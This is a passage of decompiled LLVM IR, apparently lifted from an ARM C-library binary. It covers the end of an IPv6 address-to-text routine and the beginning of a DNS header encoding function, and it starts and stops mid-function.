  %v6_1ae68 = load i32, i32* @r5, align 4
  %v25_1ae68 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1ae6c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1ae6c, label %dec_label_pc_1ae90, label %dec_label_pc_1ae84

dec_label_pc_1ae84:                               ; preds = %entry
  %v7_1ae84 = icmp eq i32 %arg1, 10
  br i1 %v7_1ae84, label %dec_label_pc_1aea4, label %dec_label_pc_1b0a4

dec_label_pc_1ae90:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1ae9c = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1b09c

dec_label_pc_1aea4:                               ; preds = %dec_label_pc_1ae84
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1aeb0 = bitcast i32* %stack_var_-64 to i8*
  %v3_1aeb0 = call i32 @__GI_memset(i8* %v2_1aeb0, i32 0)
  br label %dec_label_pc_1aed0

dec_label_pc_1aebc:                               ; preds = %dec_label_pc_1aed0
  %tmp68 = icmp slt i32 %v1_1aec0, 0
  %v4_1aed0 = zext i1 %tmp68 to i32
  %v5_1aed0 = add i32 %v4_1aed0, %v1_1aec0
  %v3_1aed4 = sdiv i32 %v5_1aed0, 2
  %v4_1aee4 = mul i32 %v3_1aed4, 4
  %v5_1aee4 = add i32 %v4_1aee4, %v25_1ae68
  %v1_1aebc = add i32 %v2_1aee0, 1
  %v2_1aebc = inttoptr i32 %v1_1aebc to i8*
  %v3_1aebc = load i8, i8* %v2_1aebc, align 1
  %v4_1aebc = zext i8 %v3_1aebc to i32
  %v3_1aec0 = inttoptr i32 %v2_1aee0 to i8*
  %v4_1aec0 = load i8, i8* %v3_1aec0, align 1
  %v6_1aec0 = zext i8 %v4_1aec0 to i32
  store i32 %v6_1aec0, i32* %r2.global-to-local, align 4
  %v4_1aec4 = mul nuw nsw i32 %v6_1aec0, 256
  %v5_1aec4 = or i32 %v4_1aec4, %v4_1aebc
  %v2_1aec8 = add i32 %v5_1aee4, -32
  %v3_1aec8 = inttoptr i32 %v2_1aec8 to i32*
  store i32 %v5_1aec4, i32* %v3_1aec8, align 4
  %v0_1aecc = load i32, i32* %r1.global-to-local, align 4
  %v1_1aecc = add i32 %v0_1aecc, 2
  br label %dec_label_pc_1aed0

dec_label_pc_1aed0:                               ; preds = %dec_label_pc_1aea4, %dec_label_pc_1aebc
  %v1_1aec0 = phi i32 [ 0, %dec_label_pc_1aea4 ], [ %v1_1aecc, %dec_label_pc_1aebc ]
  store i32 %v1_1aec0, i32* %r1.global-to-local, align 4
  %v0_1aee0 = load i32, i32* @r8, align 4
  %v2_1aee0 = add i32 %v0_1aee0, %v1_1aec0
  store i32 %v2_1aee0, i32* %r2.global-to-local, align 4
  %v7_1aee8 = icmp sgt i32 %v1_1aec0, 15
  br i1 %v7_1aee8, label %dec_label_pc_1aeec, label %dec_label_pc_1aebc

dec_label_pc_1aeec:                               ; preds = %dec_label_pc_1aed0
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aefc

dec_label_pc_1aefc:                               ; preds = %dec_label_pc_1aeec, %dec_label_pc_1af48
  %v0_1af3c = phi i32 [ -1, %dec_label_pc_1aeec ], [ %v0_1af70, %dec_label_pc_1af48 ]
  %v0_1af2c = phi i32 [ -1, %dec_label_pc_1aeec ], [ %v0_1af5c, %dec_label_pc_1af48 ]
  %v0_1af10 = phi i32 [ -1, %dec_label_pc_1aeec ], [ %v0_1af108, %dec_label_pc_1af48 ]
  %v0_1af48 = phi i32 [ 0, %dec_label_pc_1aeec ], [ %v1_1af48, %dec_label_pc_1af48 ]
  %v4_1af00 = mul nuw nsw i32 %v0_1af48, 4
  %v5_1af00 = add i32 %v4_1af00, %v25_1ae68
  %v1_1af04 = add i32 %v5_1af00, -32
  %v2_1af04 = inttoptr i32 %v1_1af04 to i32*
  %v3_1af04 = load i32, i32* %v2_1af04, align 4
  %v2_1af08 = icmp eq i32 %v3_1af04, 0
  %v7_1af10 = icmp eq i32 %v0_1af10, -1
  br i1 %v2_1af08, label %dec_label_pc_1af10, label %dec_label_pc_1af24

dec_label_pc_1af10:                               ; preds = %dec_label_pc_1aefc
  br i1 %v7_1af10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1af10
  store i32 %v0_1af48, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1af48

.thread:                                          ; preds = %dec_label_pc_1af10
  %v1_1af1c.pre = load i32, i32* @r4, align 4
  %v2_1af1c = add i32 %v1_1af1c.pre, 1
  store i32 %v2_1af1c, i32* @r4, align 4
  br label %dec_label_pc_1af48

dec_label_pc_1af24:                               ; preds = %dec_label_pc_1aefc
  br i1 %v7_1af10, label %dec_label_pc_1af48, label %dec_label_pc_1af2c

dec_label_pc_1af2c:                               ; preds = %dec_label_pc_1af24
  %v7_1af2c = icmp eq i32 %v0_1af2c, -1
  %v0_1af40.pre = load i32, i32* @r4, align 4
  %v1_1af34 = load i32, i32* @r7, align 4
  %v7_1af38 = icmp sgt i32 %v0_1af40.pre, %v1_1af34
  %or.cond = or i1 %v7_1af2c, %v7_1af38
  br i1 %or.cond, label %dec_label_pc_1af3c, label %dec_label_pc_1af44

dec_label_pc_1af3c:                               ; preds = %dec_label_pc_1af2c
  store i32 %v0_1af3c, i32* @r6, align 4
  store i32 %v0_1af40.pre, i32* @r7, align 4
  br label %dec_label_pc_1af44

dec_label_pc_1af44:                               ; preds = %dec_label_pc_1af2c, %dec_label_pc_1af3c
  %v0_1af2c13 = phi i32 [ %v0_1af3c, %dec_label_pc_1af3c ], [ %v0_1af2c, %dec_label_pc_1af2c ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1af48

dec_label_pc_1af48:                               ; preds = %bb, %.thread, %dec_label_pc_1af24, %dec_label_pc_1af44
  %v0_1af70 = phi i32 [ %v0_1af3c, %.thread ], [ %v0_1af48, %bb ], [ %v0_1af3c, %dec_label_pc_1af24 ], [ -1, %dec_label_pc_1af44 ]
  %v0_1af108 = phi i32 [ %v0_1af10, %.thread ], [ %v0_1af48, %bb ], [ -1, %dec_label_pc_1af24 ], [ -1, %dec_label_pc_1af44 ]
  %v0_1af5c = phi i32 [ %v0_1af2c, %.thread ], [ %v0_1af2c, %bb ], [ %v0_1af2c, %dec_label_pc_1af24 ], [ %v0_1af2c13, %dec_label_pc_1af44 ]
  %v1_1af48 = add nuw nsw i32 %v0_1af48, 1
  store i32 %v1_1af48, i32* %r1.global-to-local, align 4
  %v7_1af50 = icmp slt i32 %v1_1af48, 8
  br i1 %v7_1af50, label %dec_label_pc_1aefc, label %dec_label_pc_1af54

dec_label_pc_1af54:                               ; preds = %dec_label_pc_1af48
  %v7_1af54 = icmp eq i32 %v0_1af70, -1
  br i1 %v7_1af54, label %dec_label_pc_1af74, label %dec_label_pc_1af5c

dec_label_pc_1af5c:                               ; preds = %dec_label_pc_1af54
  %v7_1af5c = icmp eq i32 %v0_1af5c, -1
  %v0_1af6c.pre = load i32, i32* @r4, align 4
  br i1 %v7_1af5c, label %dec_label_pc_1af6c, label %dec_label_pc_1af64

dec_label_pc_1af64:                               ; preds = %dec_label_pc_1af5c
  %v1_1af64 = load i32, i32* @r7, align 4
  %v7_1af68 = icmp sgt i32 %v0_1af6c.pre, %v1_1af64
  br i1 %v7_1af68, label %dec_label_pc_1af6c, label %dec_label_pc_1af74

dec_label_pc_1af6c:                               ; preds = %dec_label_pc_1af5c, %dec_label_pc_1af64
  store i32 %v0_1af6c.pre, i32* @r7, align 4
  store i32 %v0_1af70, i32* @r6, align 4
  br label %dec_label_pc_1af74

dec_label_pc_1af74:                               ; preds = %dec_label_pc_1af64, %dec_label_pc_1af54, %dec_label_pc_1af6c
  %v0_1af74 = phi i32 [ %v0_1af5c, %dec_label_pc_1af64 ], [ %v0_1af5c, %dec_label_pc_1af54 ], [ %v0_1af70, %dec_label_pc_1af6c ]
  %v7_1af74 = icmp eq i32 %v0_1af74, -1
  br i1 %v7_1af74, label %bb49, label %dec_label_pc_1af7c

dec_label_pc_1af7c:                               ; preds = %dec_label_pc_1af74
  %v0_1af7c = load i32, i32* @r7, align 4
  %v7_1af80 = icmp slt i32 %v0_1af7c, 2
  br i1 %v7_1af80, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1af7c
  store i32 -1, i32* @r6, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1af74, %dec_label_pc_1af7c, %bb48
  %v0_1af9023 = phi i32 [ %v0_1af74, %dec_label_pc_1af74 ], [ %v0_1af74, %dec_label_pc_1af7c ], [ -1, %bb48 ]
  %v2_1af84 = ptrtoint i32* %stack_var_-110 to i32
  store i32 %v2_1af84, i32* @r4, align 4
  %v9_1aff0 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @r5, align 4
  %v7_1af9063 = icmp eq i32 %v0_1af9023, -1
  br label %dec_label_pc_1af90

dec_label_pc_1af90:                               ; preds = %bb49, %dec_label_pc_1b044
  %v7_1af9067 = phi i1 [ %v7_1af9063, %bb49 ], [ %v7_1af90, %dec_label_pc_1b044 ]
  %v0_1afbc66 = phi i32 [ 0, %bb49 ], [ %v1_1b044, %dec_label_pc_1b044 ]
  %v1_1afac65 = phi i32 [ %v0_1af9023, %bb49 ], [ %v0_1af90.pre, %dec_label_pc_1b044 ]
  %v3_1afc464 = phi i32 [ %v2_1af84, %bb49 ], [ %v3_1afb424, %dec_label_pc_1b044 ]
  br i1 %v7_1af9067, label %dec_label_pc_1afbc, label %dec_label_pc_1af98

dec_label_pc_1af98:                               ; preds = %dec_label_pc_1af90
  %v9_1af98 = icmp eq i32 %v0_1afbc66, %v1_1afac65
  %v5_1af9c = icmp slt i32 %v0_1afbc66, %v1_1afac65
  br i1 %v5_1af9c, label %dec_label_pc_1afbc, label %dec_label_pc_1afa0

dec_label_pc_1afa0:                               ; preds = %dec_label_pc_1af98
  %v1_1afa0 = load i32, i32* @r7, align 4
  %v2_1afa0 = add i32 %v1_1afa0, %v1_1afac65
  %v6_1afa8 = icmp slt i32 %v0_1afbc66, %v2_1afa0
  br i1 %v6_1afa8, label %dec_label_pc_1afac, label %dec_label_pc_1afbc

dec_label_pc_1afac:                               ; preds = %dec_label_pc_1afa0
  br i1 %v9_1af98, label %bb51, label %dec_label_pc_1b044

bb51:                                             ; preds = %dec_label_pc_1afac
  %v4_1afb4 = inttoptr i32 %v3_1afc464 to i8*
  store i8 58, i8* %v4_1afb4, align 1
  %v5_1afb4 = load i32, i32* @r4, align 4
  %v6_1afb4 = add i32 %v5_1afb4, 1
  store i32 %v6_1afb4, i32* @r4, align 4
  br label %dec_label_pc_1b044

dec_label_pc_1afbc:                               ; preds = %dec_label_pc_1afa0, %dec_label_pc_1af98, %dec_label_pc_1af90
  %v2_1afbc = icmp eq i32 %v0_1afbc66, 0
  br i1 %v2_1afbc, label %.thread3, label %bb52

bb52:                                             ; preds = %dec_label_pc_1afbc
  %v4_1afc4 = inttoptr i32 %v3_1afc464 to i8*
  store i8 58, i8* %v4_1afc4, align 1
  %v5_1afc4 = load i32, i32* @r4, align 4
  %v6_1afc4 = add i32 %v5_1afc4, 1
  store i32 %v6_1afc4, i32* @r4, align 4
  %v0_1afc8.pre = load i32, i32* @r5, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1afbc, %bb52
  %v0_1b008 = phi i32 [ %v3_1afc464, %dec_label_pc_1afbc ], [ %v6_1afc4, %bb52 ]
  %v1_1b02c = phi i32 [ 0, %dec_label_pc_1afbc ], [ %v0_1afc8.pre, %bb52 ]
  %v7_1afc8 = icmp eq i32 %v1_1b02c, 6
  br i1 %v7_1afc8, label %dec_label_pc_1afd0, label %dec_label_pc_1b028

dec_label_pc_1afd0:                               ; preds = %.thread3
  %v0_1afd0 = load i32, i32* @r6, align 4
  %v2_1afd0 = icmp eq i32 %v0_1afd0, 0
  br i1 %v2_1afd0, label %dec_label_pc_1afd8, label %dec_label_pc_1b028

dec_label_pc_1afd8:                               ; preds = %dec_label_pc_1afd0
  %v0_1afd8 = load i32, i32* @r7, align 4
  %v7_1afd8 = icmp eq i32 %v0_1afd8, 6
  br i1 %v7_1afd8, label %dec_label_pc_1aff8, label %dec_label_pc_1afe0

dec_label_pc_1afe0:                               ; preds = %dec_label_pc_1afd8
  %v7_1afe0 = icmp eq i32 %v0_1afd8, 5
  br i1 %v7_1afe0, label %dec_label_pc_1afe8, label %dec_label_pc_1b028

dec_label_pc_1afe8:                               ; preds = %dec_label_pc_1afe0
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br i1 %v9_1aff0, label %dec_label_pc_1aff8, label %dec_label_pc_1b028

dec_label_pc_1aff8:                               ; preds = %dec_label_pc_1afe8, %dec_label_pc_1afd8
  %v2_1affc = sub i32 %v25_1ae68, %v0_1b008
  %v0_1b000 = load i32, i32* @r8, align 4
  %v1_1b000 = add i32 %v0_1b000, 12
  %v1_1b004 = add i32 %v2_1affc, -32
  store i32 %v1_1b004, i32* %r2.global-to-local, align 4
  store i32 %v0_1b008, i32* %r1.global-to-local, align 4
  %v3_1b00c = call i32 @inet_ntop4(i32 %v1_1b000, i32 %v0_1b008, i32 %v1_1b004)
  %v2_1b010 = icmp eq i32 %v3_1b00c, 0
  br i1 %v2_1b010, label %dec_label_pc_1b09c, label %dec_label_pc_1b018

dec_label_pc_1b018:                               ; preds = %dec_label_pc_1aff8
  %v0_1b018 = load i32, i32* @r4, align 4
  %v1_1b018 = inttoptr i32 %v0_1b018 to i8*
  %v3_1b01c = call i32 @strlen(i8* %v1_1b018)
  %v0_1b020 = load i32, i32* @r4, align 4
  %v2_1b020 = add i32 %v0_1b020, %v3_1b01c
  store i32 %v2_1b020, i32* @r4, align 4
  %v0_1b058.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b058

dec_label_pc_1b028:                               ; preds = %dec_label_pc_1afe8, %dec_label_pc_1afe0, %dec_label_pc_1afd0, %.thread3
  %v4_1b02c = mul i32 %v1_1b02c, 4
  %v5_1b02c = add i32 %v4_1b02c, %v25_1ae68
  store i32 %v0_1b008, i32* @r0, align 4
  %v1_1b034 = add i32 %v5_1b02c, -32
  %v2_1b034 = inttoptr i32 %v1_1b034 to i32*
  %v3_1b034 = load i32, i32* %v2_1b034, align 4
  store i32 %v3_1b034, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_206f0.1232 to i32), i32* %r1.global-to-local, align 4
  %v3_1b03c = call i32 @sprintf(i32 %v0_1b008, i32 ptrtoint ([3 x i8]* @global_var_206f0.1232 to i32))
  %v0_1b040 = load i32, i32* @r4, align 4
  %v2_1b040 = add i32 %v0_1b040, %v3_1b03c
  store i32 %v2_1b040, i32* @r4, align 4
  br label %dec_label_pc_1b044

dec_label_pc_1b044:                               ; preds = %dec_label_pc_1afac, %bb51, %dec_label_pc_1b028
  %v3_1afb424 = phi i32 [ %v3_1afc464, %dec_label_pc_1afac ], [ %v6_1afb4, %bb51 ], [ %v2_1b040, %dec_label_pc_1b028 ]
  %v0_1b044 = load i32, i32* @r5, align 4
  %v1_1b044 = add i32 %v0_1b044, 1
  %v0_1af90.pre = load i32, i32* @r6, align 4
  store i32 %v1_1b044, i32* @r5, align 4
  %v7_1b04c = icmp slt i32 %v1_1b044, 8
  %v7_1af90 = icmp eq i32 %v0_1af90.pre, -1
  br i1 %v7_1b04c, label %dec_label_pc_1af90, label %dec_label_pc_1b050

dec_label_pc_1b050:                               ; preds = %dec_label_pc_1b044
  br i1 %v7_1af90, label %.thread4, label %dec_label_pc_1b058

dec_label_pc_1b058:                               ; preds = %dec_label_pc_1b050, %dec_label_pc_1b018
  %v3_1b064 = phi i32 [ %v3_1afb424, %dec_label_pc_1b050 ], [ %v2_1b020, %dec_label_pc_1b018 ]
  %v0_1b058 = phi i32 [ %v0_1af90.pre, %dec_label_pc_1b050 ], [ %v0_1b058.pre, %dec_label_pc_1b018 ]
  %v1_1b058 = load i32, i32* @r7, align 4
  %v2_1b058 = add i32 %v1_1b058, %v0_1b058
  %v7_1b05c = icmp eq i32 %v2_1b058, 8
  br i1 %v7_1b05c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_1b058
  %v4_1b064 = inttoptr i32 %v3_1b064 to i8*
  store i8 58, i8* %v4_1b064, align 1
  %v5_1b064 = load i32, i32* @r4, align 4
  %v6_1b064 = add i32 %v5_1b064, 1
  store i32 %v6_1b064, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b058, %dec_label_pc_1b050, %bb53
  %v2_1b06c = phi i32 [ %v3_1b064, %dec_label_pc_1b058 ], [ %v3_1afb424, %dec_label_pc_1b050 ], [ %v6_1b064, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1b06c = inttoptr i32 %v2_1b06c to i8*
  store i8 0, i8* %v3_1b06c, align 1
  %v4_1b06c = load i32, i32* @r4, align 4
  %v5_1b06c = add i32 %v4_1b06c, 1
  store i32 %v2_1af84, i32* %r1.global-to-local, align 4
  %v2_1b074 = sub i32 %v5_1b06c, %v2_1af84
  %v1_1b078 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_1b074, %v1_1b078
  br i1 %tmp69, label %dec_label_pc_1b080, label %dec_label_pc_1b094

dec_label_pc_1b080:                               ; preds = %.thread4
  %v0_1b080 = call i32 @__errno_location()
  %v0_1b088 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b088, i32* %r2.global-to-local, align 4
  %v2_1b08c = inttoptr i32 %v0_1b080 to i32*
  store i32 28, i32* %v2_1b08c, align 4
  %v0_1b0b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b0b4

dec_label_pc_1b094:                               ; preds = %.thread4
  %v0_1b094 = load i32, i32* @sb, align 4
  %v2_1b098 = bitcast i32* %stack_var_-110 to i8*
  %v3_1b098 = call i32 @strcpy(i32 %v0_1b094, i8* %v2_1b098)
  br label %dec_label_pc_1b09c

dec_label_pc_1b09c:                               ; preds = %dec_label_pc_1aff8, %dec_label_pc_1ae90, %dec_label_pc_1b094
  %v0_1b09c = phi i32 [ 0, %dec_label_pc_1aff8 ], [ %v3_1ae9c, %dec_label_pc_1ae90 ], [ %v3_1b098, %dec_label_pc_1b094 ]
  store i32 %v0_1b09c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b0b4

dec_label_pc_1b0a4:                               ; preds = %dec_label_pc_1ae84
  %v0_1b0a4 = call i32 @__errno_location()
  %v2_1b0ac = inttoptr i32 %v0_1b0a4 to i32*
  store i32 97, i32* %v2_1b0ac, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b0b4

dec_label_pc_1b0b4:                               ; preds = %dec_label_pc_1b09c, %dec_label_pc_1b080, %dec_label_pc_1b0a4
  %v0_1b0b4 = phi i32 [ %v0_1b09c, %dec_label_pc_1b09c ], [ %v0_1b0b4.pre, %dec_label_pc_1b080 ], [ 0, %dec_label_pc_1b0a4 ]
  store i32 %v6_1ae68, i32* %r5.global-to-local, align 4
  ret i32 %v0_1b0b4

; uselistorder directives
  uselistorder i1 %v7_1af90, { 1, 0 }
  uselistorder i32 %v0_1af90.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1b044, { 1, 0, 2 }
  uselistorder i32 %v0_1b008, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_1afc464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1afac65, { 2, 0, 1 }
  uselistorder i32 %v0_1afbc66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_1af84, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1af9023, { 1, 0 }
  uselistorder i32 %v0_1af74, { 1, 2, 0 }
  uselistorder i32 %v1_1af48, { 1, 2, 0 }
  uselistorder i32 %v0_1af5c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1af70, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1af10, { 1, 0 }
  uselistorder i32 %v0_1af48, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1af2c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1af3c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1aee0, { 2, 1, 0 }
  uselistorder i32 %v1_1aec0, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_1ae68, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 9, 0, 1, 10, 7, 8, 2, 3, 4 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 2, 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 1, 2, 13, 19, 20, 21, 31, 29, 25, 30, 22, 3, 14, 15, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 16, 17, 18, 23, 24, 28, 26, 27 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1b0b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b09c, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b044, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1af90, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1af74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1af6c, { 1, 0 }
  uselistorder label %dec_label_pc_1af48, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1af44, { 1, 0 }
  uselistorder label %dec_label_pc_1aefc, { 1, 0 }
  uselistorder label %dec_label_pc_1aed0, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_1b0cc = load i32, i32* @r4, align 4
  store i32 %v3_1b0cc, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_1b0dc = icmp sgt i32 %arg3, 11
  br i1 %v7_1b0dc, label %dec_label_pc_1b0e0, label %dec_label_pc_1b1a8

dec_label_pc_1b0e0:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_1b0e0 = add i32 %tmp, 1
  %v2_1b0e0 = inttoptr i32 %v1_1b0e0 to i8*
  %v3_1b0e0 = load i8, i8* %v2_1b0e0, align 1
  store i8 %v3_1b0e0, i8* %tmp18, align 1
  %v2_1b0e8 = load i32, i32* %arg1, align 4
  %v1_1b0ec = trunc i32 %v2_1b0e8 to i8
  %v4_1b0ec = add i32 %arg2, 1
  %v5_1b0ec = inttoptr i32 %v4_1b0ec to i8*
  store i8 %v1_1b0ec, i8* %v5_1b0ec, align 1
  %v0_1b0f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b0f0 = add i32 %v0_1b0f0, 12
  %v2_1b0f0 = inttoptr i32 %v1_1b0f0 to i32*
  %v3_1b0f0 = load i32, i32* %v2_1b0f0, align 4
  %v1_1b0f4 = add i32 %v0_1b0f0, 4
  %v2_1b0f4 = inttoptr i32 %v1_1b0f4 to i32*
  %v3_1b0f4 = load i32, i32* %v2_1b0f4, align 4
  %v1_1b0f8 = add i32 %v0_1b0f0, 16
  %v2_1b0f8 = inttoptr i32 %v1_1b0f8 to i32*
  %v3_1b0f8 = load i32, i32* %v2_1b0f8, align 4
  %v1_1b0fc = add i32 %tmp, 8
  %v2_1b0fc = inttoptr i32 %v1_1b0fc to i32*
  %v3_1b0fc = load i32, i32* %v2_1b0fc, align 4
  %v2_1b100 = icmp eq i32 %v3_1b0f0, 0
  %. = select i1 %v2_1b100, i32 0, i32 4
  %v2_1b10c = icmp eq i32 %v3_1b0f4, 0
  %v1_1b110 = add i32 %v0_1b0f0, 20
  %v2_1b110 = inttoptr i32 %v1_1b110 to i32*
  %v3_1b110 = load i32, i32* %v2_1b110, align 4
  %storemerge12 = select i1 %v2_1b10c, i32 0, i32 128
  %v1_1b11c = urem i32 %v3_1b0fc, 16
  %v2_1b120 = icmp eq i32 %v3_1b0f8, 0
  %.29 = select i1 %v2_1b120, i32 0, i32 2
  %v4_1b12c = mul nuw nsw i32 %v1_1b11c, 8
  %v5_1b12c = or i32 %v4_1b12c, %.
  %v2_1b130 = icmp eq i32 %v3_1b110, 0
  br i1 %v2_1b130, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_1b0e0
  %v2_1b134 = or i32 %v5_1b12c, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1b0e0, %bb25
  %v1_1b13c = phi i32 [ %v5_1b12c, %dec_label_pc_1b0e0 ], [ %v2_1b134, %bb25 ]
  %v2_1b138 = or i32 %.29, %storemerge12
  %v2_1b13c = or i32 %v2_1b138, %v1_1b13c
  %v1_1b140 = trunc i32 %v2_1b13c to i8
  %v2_1b140 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b140 = add i32 %v2_1b140, 2
  %v4_1b140 = inttoptr i32 %v3_1b140 to i8*
  store i8 %v1_1b140, i8* %v4_1b140, align 1
  %v0_1b144 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b144 = add i32 %v0_1b144, 24
  %v1_1b148 = inttoptr i32 %v1_1b144 to i32*
  %v2_1b148 = load i32, i32* %v1_1b148, align 4
  %v3_1b148 = add i32 %v0_1b144, 28
  %v4_1b148 = inttoptr i32 %v3_1b148 to i32*
  %v5_1b148 = load i32, i32* %v4_1b148, align 4
  %v2_1b14c = icmp eq i32 %v2_1b148, 0
  %v1_1b150 = urem i32 %v5_1b148, 16
  %.30 = select i1 %v2_1b14c, i32 0, i32 128
  %v2_1b15c = or i32 %v1_1b150, %.30
  %v1_1b160 = trunc i32 %v2_1b15c to i8
  %v2_1b160 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b160 = add i32 %v2_1b160, 3
  %v4_1b160 = inttoptr i32 %v3_1b160 to i8*
  store i8 %v1_1b160, i8* %v4_1b160, align 1
  %v0_1b164 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b164 = add i32 %v0_1b164, 33
  %v2_1b164 = inttoptr i32 %v1_1b164 to i8*
  %v3_1b164 = load i8, i8* %v2_1b164, align 1
  %v2_1b168 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b168 = add i32 %v2_1b168, 4
  %v4_1b168 = inttoptr i32 %v3_1b168 to i8*
  store i8 %v3_1b164, i8* %v4_1b168, align 1
  %v0_1b16c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b16c = add i32 %v0_1b16c, 32
  %v2_1b16c = inttoptr i32 %v1_1b16c to i32*
  %v3_1b16c = load i32, i32* %v2_1b16c, align 4
  %v1_1b170 = trunc i32 %v3_1b16c to i8
  %v2_1b170 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b170 = add i32 %v2_1b170, 5
  %v4_1b170 = inttoptr i32 %v3_1b170 to i8*
  store i8 %v1_1b170, i8* %v4_1b170, align 1
  %v0_1b174 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b174 = add i32 %v0_1b174, 37
  %v2_1b174 = inttoptr i32 %v1_1b174 to i8*
  %v3_1b174 = load i8, i8* %v2_1b174, align 1
  %v2_1b178 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b178 = add i32 %v2_1b178, 6
  %v4_1b178 = inttoptr i32 %v3_1b178 to i8*
  store i8 %v3_1b174, i8* %v4_1b178, align 1
  %v0_1b17c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b17c = add i32 %v0_1b17c, 36
  %v2_1b17c = inttoptr i32 %v1_1b17c to i32*
  %v3_1b17c = load i32, i32* %v2_1b17c, align 4
  %v1_1b180 = trunc i32 %v3_1b17c to i8
  %v2_1b180 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b180 = add i32 %v2_1b180, 7
  %v4_1b180 = inttoptr i32 %v3_1b180 to i8*
  store i8 %v1_1b180, i8* %v4_1b180, align 1
  %v0_1b184 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b184 = add i32 %v0_1b184, 41
  %v2_1b184 = inttoptr i32 %v1_1b184 to i8*
  %v3_1b184 = load i8, i8* %v2_1b184, align 1
  %v2_1b188 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b188 = add i32 %v2_1b188, 8
  %v4_1b188 = inttoptr i32 %v3_1b188 to i8*
  store i8 %v3_1b184, i8* %v4_1b188, align 1
  %v0_1b18c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b18c = add i32 %v0_1b18c, 40
  %v2_1b18c = inttoptr i32 %v1_1b18c to i32*
  %v3_1b18c = load i32, i32* %v2_1b18c, align 4
  %v1_1b190 = trunc i32 %v3_1b18c to i8
